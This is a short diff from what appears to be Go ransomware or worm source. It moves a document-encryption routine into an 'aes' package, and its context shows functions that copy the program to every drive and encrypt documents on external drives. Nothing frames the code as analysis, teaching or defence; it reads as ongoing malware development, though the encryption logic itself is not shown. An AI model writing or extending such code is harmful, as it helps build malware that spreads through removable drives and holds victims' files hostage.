@@ -4,6 +4,7 @@ import "github.com/cleversoap/go-cp"
 import "os"
 import "strings"
 import "time"
+import "../aes"
 
 func CopyToDrives() {
 	drives := GetDrives()
@@ -18,7 +19,7 @@ func CopyToDrives() {
 func EncryptExternalDrives(mode bool) {
 	drives := GetDrives()
 	for _, drive := range drives {
-		EncryptDocumets(drive+":\\", mode)
+		aes.EncryptDocumets(drive+":\\", mode)
 	}
 }
 
